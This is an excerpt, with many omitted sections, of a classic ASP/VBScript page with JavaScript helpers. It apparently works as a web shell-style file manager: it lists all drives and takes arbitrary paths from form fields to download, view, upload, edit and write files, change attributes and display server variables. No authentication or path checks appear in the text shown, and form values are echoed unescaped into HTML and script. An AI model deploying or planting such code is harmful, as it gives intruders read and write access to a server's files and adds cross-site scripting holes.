...
''
If Not Request.Form("download") = "" Or Not Request.Form("view") = "" Then
	Dim strFile
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	If Not Request.Form("download") = "" Then
		strFile = Request.Form("download")
	Else
		strFile = Request.Form("view")
	End If
...
''
If Not Request.Form("list") = "" Then

	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	objStartFolder = Request.Form("list")
	strFile = ""

	If Request.Form("level") = "" Then
		intMaxLevel = -1
	Else
		intMaxLevel = Int(Request.Form("level"))
	End If
...
If Not Request.Form("upload") = "" Then
	Dim strDestination
	strDestination = Request.Form("upload")
...
ElseIf Not Request.Form("attributes") = "" Then
	...
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	strItem = Trim(Request.Form("attributes"))
...
%>
	<form method='post' action=''>
		<input type='hidden' name='attributes' value='<%=strItem%>'>
		<table border='1'>
			<tr>
...
ElseIf Not Request.Form("properties") = "" Then

	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	strItem = Trim(Request.Form("properties"))
...
ElseIf Not Request.Form("edit") = "" Then
	Dim arSearch, strEncoding, strData, strCurrentEncoding
	arSearch = Filter(arEncodings, Request.Form("encoding"))
	If Ubound(arSearch) = 0 Then
		strEncoding = Request.Form("encoding")
	Else
		strEncoding = arEncodings(0)
	End If

	If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
		fileWriteText Request.Form("edit"), Request.Form("contents"), strEncoding
	End If

	strData = strConvertHTML(fileReadText(Request.Form("edit"), strEncoding))

	If Err.Number = 0 Then
%>
	<form method='post' action=''>
		<input type='hidden' name='edit' value='<%=Request.Form("edit")%>'>
		<span>File</span>
		<input type='text' name='name' value='<%=Request.Form("edit")%>' size='50' readonly='true' class='disabled'>
		<span>Encoding</span>
		<select name='encoding' onchange='if(this.options[this.selectedIndex].value) { document.getElementsByName("encoding")[0].value = this.options[this.selectedIndex].value; this.form.submit(); }'>
<%
...
ElseIf Request.Form("server") = "variables" Then
...
Else
	...
	If Err.Number <> 0 Then
		Select Case Err.Number
			Case 76 ' Path not found
				strErrorMsg = "Path not found: " & strFolder
			Case 70 ' Permission denied
				strErrorMsg = "Permission denied: Cannot access " & strFolder
			Case 5 ' Invalid procedure call or argument
				strErrorMsg = "Invalid path: " & strFolder
			Case Else
				strErrorMsg = "Error accessing folder: " & Err.Description
		End Select
	End If
	...
	<form method='post' action='' name='form'>
		<input type='hidden' name='browse' value='<%=strFolder%>'>
		<table border='1'>
			<thead><tr>
...
<%
		...
		' Try to access folder contents with error handling
		On Error Resume Next
		Set colFiles = objFolder.Files
		If Err.Number <> 0 Then
			' If we can't access files, create empty collection
			Set colFiles = Server.CreateObject("Scripting.Dictionary")
			Err.Clear
		End If
		
		Set colSubfolders = objFolder.SubFolders
		If Err.Number <> 0 Then
			' If we can't access subfolders, create empty collection
			Set colSubfolders = Server.CreateObject("Scripting.Dictionary")
			Err.Clear
		End If
		...
		If Not strParent Is Nothing Then
			...
			With Response
				...
				.Write Tab(5) & "<a href='#' onclick='browsePost(""" & Replace(Replace(strParent, "\", "\\"), """", "\""") & """); return false;'>..</a>" & vbCRLF
				.Write Tab(4) & "</td>" & vbCRLF
		...
		If colSubfolders.Count > 0 Then
			For Each objSubFolder In colSubfolders
				With Response
					...
					.Write Tab(4) & "<td>" & vbCRLF
					.Write Tab(5) & "<a href='#' onclick='browsePost(""" & Replace(Replace(objSubFolder.Path, "\", "\\"), """", "\""") & "\\""); return false;'>" & objSubFolder.Name & "\</a>" & vbCRLF
					.Write Tab(4) & "</td>" & vbCRLF
				End With
...
%>
			...
			<tr>
				<td colspan='8'>
					...
					<input type='button' onclick='uploadFilePost()' value='Upload File'>
				</td>
			</tr>
			<tr>
			...
			<tr>
				<td colspan='8'>
					...
					<select name='drive_select' onchange='if(this.options[this.selectedIndex].value) { document.getElementsByName("browse")[0].value = this.options[this.selectedIndex].value; document.forms[0].submit(); }'>
...
<%
		For Each objDrive in objFSO.Drives
			...
			End Select
			Response.Write Tab(6) & "<option value='" & objDrive.DriveLetter & ":\'>[" & UCase(strDriveType) & "] " & objDrive.DriveLetter & ":\</option>" & vbCRLF
		Next
%>
					</select>
					<span>(<a href='#' onclick='serverVariablesPost(); return false;'>Server Variables</a>)</span>
				</td>
			</tr></tbody>
		</table>
	</form>
...
%>
		<script language='JavaScript'>
			alert('<%=Replace(strErrorMsg, "'", "\''")%>');
			// Go back to previous folder or root
			if (window.history.length > 1) {
				...
				form.method = 'POST';
				form.action = '<%=strScript%>';
				var input = document.createElement('input');
				input.type = 'hidden';
				input.name = 'browse';
				input.value = '<%=Request.ServerVariables("APPL_PHYSICAL_PATH")%>';
...
%>
	<script language='JavaScript'>
		...
		*/
		...
		/*
		* Browse to a directory using POST
		*/
		function browsePost(path)
		{
			document.getElementsByName("browse")[0].value = path;
			document.forms[0].submit();
		}

		/*
		* Show server variables using POST
		*/
		function serverVariablesPost()
		{
			var form = document.createElement('form');
			form.method = 'POST';
		...
		*/
		function uploadFilePost()
		{
			...
			input.type = 'hidden';
			input.name = 'upload';
			input.value = document.getElementsByName("cwd_")[0].value;
			form.appendChild(input);
			document.body.appendChild(form);
			form.submit();
			document.body.removeChild(form);
		...
		*/
		function chdir()
		{
			...
			if (cwd != "")
			{
				document.getElementsByName("browse")[0].value = cwd.value;
				document.forms[0].submit();
			}
		}
				...
				case "attributes":
					...
					for(var i = 0, n = checkboxes.length; i < n; i++)
					{
						if(checkboxes[i].checked)
						{
							...
							input.type = 'hidden';
							input.name = action;
							input.value = cwd + "\\" + checkboxes[i].value;
							form.appendChild(input);
							document.body.appendChild(form);
							form.submit();
							document.body.removeChild(form);
